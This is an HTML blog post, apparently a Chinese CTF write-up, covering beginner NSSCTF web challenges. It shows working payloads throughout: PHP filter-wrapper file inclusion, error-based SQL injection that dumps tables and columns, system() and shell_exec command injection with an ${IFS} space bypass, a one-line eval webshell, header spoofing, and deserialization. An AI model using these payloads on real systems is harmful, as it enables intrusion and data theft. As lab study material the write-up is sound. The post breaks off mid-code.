@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="xuan tu">
+
+
+
+
+
+
+
+<title>nssctf web wp | 曲径通幽处.</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+
+
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            ヾ(^_^) back Home.!!
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">主页</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">文章</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a target="_blank" rel="noopener" href="https://drive.google.com/drive/folders/1a-OiD9e0tEgNmWDoR0RGkhBtp-v8TQq8?usp=drive_link">书阁(M)</a>
+              </li> 
+                   
+          
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
+        </div>
+        <div class="post-title">
+            
+            
+                nssctf web wp
+            
+            
+        </div>
+        <span class="post-date">
+            3月 14, 2024
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <p>nssctf web</p>
+<h1 id="SWPUCTF-2021-新生赛-include"><a href="#SWPUCTF-2021-新生赛-include" class="headerlink" title="[SWPUCTF 2021 新生赛]include"></a>[SWPUCTF 2021 新生赛]include</h1><h2 id="知识点：php伪协议"><a href="#知识点：php伪协议" class="headerlink" title="知识点：php伪协议"></a>知识点：php伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#题目：</span><br><span class="line">传入一个file试试</span><br></pre></td></tr></table></figure>
+
+<p>file伪协议例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=file://C:desktop</span><br></pre></td></tr></table></figure>
+
+<p>自己尝试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">靶机地址/?file=file   #说明：可以：/?file=…一个随意参数</span><br></pre></td></tr></table></figure>
+
+<p>得到了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>,<span class="string">&quot;on&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag 在flag.php中&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;传入一个file试试&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span> flag 在flag.php中</span><br></pre></td></tr></table></figure>
+
+<p>最终解法：</p>
+<p>在url栏：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">靶机地址/?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>得到base64加密的flag</p>
+<h1 id="SWPUCTF-2021-新生赛-error"><a href="#SWPUCTF-2021-新生赛-error" class="headerlink" title="[SWPUCTF 2021 新生赛]error"></a>[SWPUCTF 2021 新生赛]error</h1><h2 id="知识点-sql注入"><a href="#知识点-sql注入" class="headerlink" title="知识点:sql注入"></a>知识点:sql注入</h2><p>自己的尝试：</p>
+<p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&quot;select * from * where 1=1</span><br></pre></td></tr></table></figure>
+
+<p>发现url处：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28629/index.php?id=%27%22select+*+from+*+where+1%3D1</span><br></pre></td></tr></table></figure>
+
+<p>而且页面提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&quot;select * from * where 1=1&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class="line">#翻译</span><br><span class="line">您的 SQL 语法有错误；检查与您的 MariaDB 服务器版本相对应的手册，了解在第 1 行“select *”LIMIT 0,1”附近使用的正确语法</span><br></pre></td></tr></table></figure>
+
+<p>由此我们得知其用的数据库为：MariaDB server</p>
+<p>而且我们得知<code>&quot;select * from * where 1=1</code>这段是有效的</p>
+<p>此类sql注入属于<code>报错注入</code></p>
+<p>用下面语句让错误信息提供数据库名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select database()))))#</span><br></pre></td></tr></table></figure>
+
+<p>得知数据库名叫：<code>test_db</code></p>
+<h1 id="SWPUCTF-2021-新生赛-easy-sql"><a href="#SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_sql"></a>[SWPUCTF 2021 新生赛]easy_sql</h1><h2 id="知识点：sql注入"><a href="#知识点：sql注入" class="headerlink" title="知识点：sql注入"></a>知识点：sql注入</h2><p>拓展阅读：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/GTL-JU/p/16054806.html">https://www.cnblogs.com/GTL-JU/p/16054806.html</a></p>
+<p>靶机提示：参数为wllm，wllm是日志相关的参数，默认为1</p>
+<p>我们试着在url后面加<code>/?wllm=-1</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url/?wllm=-1</span><br><span class="line">url/?wllm=-1&#x27;select *</span><br></pre></td></tr></table></figure>
+
+<p>发现显示了报错信息，判断可以用到报错注入</p>
+<p>网上搜索报错注入的常规方法</p>
+<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><p><code>updatexml</code> 函数用于更新 XML 文档中的节点值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?wllm=-1&#x27; and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir%20 ),1) --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h2><p><code>concat()</code> 函数用于将多个字符串连接在一起.</p>
+<ul>
+<li><code>0x7e</code>：表示波浪号 (~)。</li>
+<li><code>database()</code>：返回当前数据库的名称。</li>
+<li><code>0x7e</code>：表示波浪号 (~)。</li>
+<li><code>user()</code>：返回当前用户的名称。</li>
+<li><code>0x7e</code>：表示波浪号 (~)。</li>
+<li><code>@@datadir</code>：返回数据文件所在的目录。</li>
+</ul>
+<p>因此这条语句将返回数据库的名称、用户名、数据文件所在目录，中间用~隔开</p>
+<h2 id="table-name"><a href="#table-name" class="headerlink" title="table_name"></a>table_name</h2><p>分开看比较清楚：</p>
+<p><strong>这一步用来爆出所有表的名称</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">url/?wllm=-1&#x27; and updatexml(1,concat((</span><br><span class="line"></span><br><span class="line">select group_concat(table_name) </span><br><span class="line">from information_schema.columns </span><br><span class="line">where table_schema=database()</span><br><span class="line"></span><br><span class="line">) ),1) --+</span><br></pre></td></tr></table></figure>
+
+<p><code>table_schema</code> 来指定表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_schema = test</span><br></pre></td></tr></table></figure>
+
+<p>得到了报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;,test_tb,users,users,users&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>由此得到了table_names&#x3D; ‘,test_tb,users,users,users’</p>
+<h2 id="column-name"><a href="#column-name" class="headerlink" title="column_name"></a>column_name</h2><p><strong>这一步用来爆出所有列的名称</strong></p>
+<p>在上一步里把table_name改为column_name即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?wllm=-1&#x27; and updatexml(1,concat((select group_concat(column_name) from information_schema.columns where table_schema=database()) ),1) --+</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;,flag,id,username,password&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>读列：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?wllm=-1&#x27; and updatexml(1,concat((select group_concat(flag) from test_tb ) ),1) --+</span><br></pre></td></tr></table></figure>
+
+<p>显示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;&#123;10e50f48-ac3d-4d07-b307-b996b84&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>发现回显不全，于是用到</p>
+<h2 id="mid"><a href="#mid" class="headerlink" title="mid()"></a>mid()</h2><p>SQL 的 <code>MID()</code> 函数用于从文本字符串中提取子字符串。该函数接受以下参数：</p>
+<ul>
+<li>**<code>text</code>**：要提取子字符串的文本字符串。</li>
+<li>**<code>start</code>**：子字符串的起始位置。</li>
+<li>**<code>length</code>**：子字符串的长度。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mid(sql语句,1,38)   1~38：XPATH syntax error: &#x27;&#123;10e50f48-ac3d-4d07-b307-b996b84&#x27;</span><br><span class="line">mid(sql语句,33,6)  33后的几个字符 ：XPATH syntax error: &#x27;466c3&#125;&#x27;</span><br><span class="line">具体代码：</span><br><span class="line">url/?wllm=-1&#x27; and updatexml(1,concat(mid((select group_concat(flag) from test_tb )1,38) ),1) --+</span><br></pre></td></tr></table></figure>
+
+<p>合起来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;&#123;10e50f48-ac3d-4d07-b307-b996b84466c3&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h1 id="SWPUCTF-2021-新生赛-easyrce"><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h1><h2 id="知识点：rce远程代码执行漏洞"><a href="#知识点：rce远程代码执行漏洞" class="headerlink" title="知识点：rce远程代码执行漏洞"></a>知识点：rce远程代码执行漏洞</h2><ul>
+<li><strong>RCE</strong>-远程代码执行：远程执行PHP代码</li>
+<li><strong>RCE</strong>-远程命令执行：远程执行Linux或者Windows等系统命令。</li>
+</ul>
+<p>操作方法：</p>
+<p>依然是在网站的url上进行操作</p>
+<p>加上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机地址/?url=system(&#x27;ls /&#x27;);</span><br><span class="line">靶机地址/?url=system(&#x27;cat /flllllaaaaa&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h1 id="SWPUCTF-2021-新生赛-caidao"><a href="#SWPUCTF-2021-新生赛-caidao" class="headerlink" title="[SWPUCTF 2021 新生赛]caidao"></a>[SWPUCTF 2021 新生赛]caidao</h1><h2 id="知识点：webshell"><a href="#知识点：webshell" class="headerlink" title="知识点：webshell"></a>知识点：webshell</h2><p>网站图片提示了一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval($_POST[&#x27;wllm&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<p>用中国蚁剑连接查看目录可以得到flag</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20240311232004542.png" alt="image-20240311232004542"></p>
+<p>还可以</p>
+<p>post传⼊</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm=echo &#x27;cat /flag&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h1 id="SWPUCTF-2021-新生赛-Do-you-know-http"><a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="[SWPUCTF 2021 新生赛]Do_you_know_http"></a>[SWPUCTF 2021 新生赛]Do_you_know_http</h1><h2 id="知识点：http协议-burpsuit重放器的使用"><a href="#知识点：http协议-burpsuit重放器的使用" class="headerlink" title="知识点：http协议 burpsuit重放器的使用"></a>知识点：http协议 burpsuit重放器的使用</h2><p>限制条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1，Please use &#x27;WLLM&#x27; browser!</span><br><span class="line">2，You can only read this at local!</span><br><span class="line">3，Your address221.15.81.206</span><br></pre></td></tr></table></figure>
+
+<p>用burpsuit抓包，然后右键点击<code>发送到repeater</code></p>
+<p>随后点击<code>重放器</code></p>
+<p>此时可以构造请求，在右侧还能看到相应</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For：127.0.0.1</span><br><span class="line">User-Agent: WLLM</span><br></pre></td></tr></table></figure>
+
+<p>两个条件都满足后，在响应里面看到了&#x2F;secretttt.php，访问即可得到flag</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20240312222105796.png" alt="image-20240312222105796"></p>
+<h1 id="第五空间-2021-WebFTP"><a href="#第五空间-2021-WebFTP" class="headerlink" title="[第五空间 2021]WebFTP"></a>[第五空间 2021]WebFTP</h1><h2 id="知识点：目录扫描-dirsearch"><a href="#知识点：目录扫描-dirsearch" class="headerlink" title="知识点：目录扫描 dirsearch"></a>知识点：目录扫描 dirsearch</h2><p>用kali工具dirsearch扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/maurosoria/dirsearch</span><br><span class="line">cd dirsearch</span><br><span class="line">python3 dirsearch.py -u node4.anna.nssctf.cn:28435</span><br></pre></td></tr></table></figure>
+
+<p>发现关键文件：phpinfo.php</p>
+<p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20240312224831658.png" alt="image-20240312224831658">直接访问phpinfo.php，搜索flag即可出结果</p>
+<h1 id="SWPUCTF-2021-新生赛-babyrce"><a href="#SWPUCTF-2021-新生赛-babyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]babyrce"></a>[SWPUCTF 2021 新生赛]babyrce</h1><h2 id="知识点：Cookie注入-rce远程代码执行漏洞"><a href="#知识点：Cookie注入-rce远程代码执行漏洞" class="headerlink" title="知识点：Cookie注入 rce远程代码执行漏洞"></a>知识点：Cookie注入 rce远程代码执行漏洞</h2><p>题目</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;admin&#x27;</span>]==<span class="number">1</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;../next.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;小饼干最好吃啦！&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>关键是需要让$_COOKIE[‘admin’]&#x3D;&#x3D;1</p>
+<p>如何进行Cookie注入？</p>
+<p>1，抓包</p>
+<p>2，修改数据（如果不熟悉http协议的话，可以在右侧的Inspector输入值添加）<img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20240313171745663.png" alt="image-20240313171745663"></p>
+<p>看到响应出现&#x2F;rasalghul.php，于是访问</p>
+<p>回显：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>上面代码的作用，问问ai：</p>
+<ol>
+<li>使用 <code>error_reporting(0)</code> 关闭错误报告。</li>
+<li>使用 <code>highlight_file(__FILE__)</code> 高亮显示当前文件的代码。</li>
+<li>再次使用 <code>error_reporting(0)</code> 关闭错误报告。</li>
+<li>检查 <code>$_GET</code> 数组中是否包含 <code>url</code> 参数。</li>
+<li>如果存在 <code>url</code> 参数，则将其赋值给变量 <code>$ip</code>。</li>
+<li>使用 <code>preg_match(&quot;/ /&quot;, $ip)</code> 检查 <code>$ip</code> 是否包含空格。</li>
+<li>如果 <code>$ip</code> 包含空格，则输出错误信息 “nonono” 并退出程序。</li>
+<li>使用 <code>shell_exec($ip)</code> 执行 <code>$ip</code> 指定的命令。</li>
+<li>使用 <code>echo $a</code> 输出命令的执行结果。</li>
+</ol>
+<p>由此得知：</p>
+<p>我们不能直接使用空格</p>
+<p>遂搜索“url中能代替空格的字符”，试试<code>%20</code>,不行，再用<code>$&#123;IFS&#125;</code>，可行,<strong>${IFS} 可以代替空格，因为它可以用于将输入字符串分割成单独的字段。他是bash shell中的</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">靶机地址/rasalghul.php?url=ls$&#123;IFS&#125;/;</span><br></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>
+
+<p>访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">靶机地址/rasalghul.php?url=cat$&#123;IFS&#125;/f*;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h1 id="SWPUCTF-2021-新生赛-ez-unserialize"><a href="#SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="[SWPUCTF 2021 新生赛]ez_unserialize"></a>[SWPUCTF 2021 新生赛]ez_unserialize</h1><h2 id="知识点：反序列化"><a href="#知识点：反序列化" class="headerlink" title="知识点：反序列化"></a>知识点：反序列化</h2><p><img src="https://tuchuan-1317533020.cos.ap-nanjing.myqcloud.com/image/image-20240313175443625.png" alt="image-20240313175443625"></p>
+<p>看f12,</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *Disallow 什么东西呢</span><br></pre></td></tr></table></figure>
+
+<p>是写在robots.txt中的一段参数</p>
+<p>访问robots.txt试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /cl45s.php</span><br></pre></td></tr></table></figure>
+
+<p>访问&#x2F;cl45s.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;cl45s.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Just a bit more!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>关键是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">           <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>需要构造payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$admin</span>,<span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin =<span class="variable">$admin</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag_raw</span> = <span class="keyword">new</span> <span class="title function_ invoke__">wllm</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;ctf&quot;</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$flag_raw</span>);</span><br><span class="line"><span class="keyword">echo</span> <span 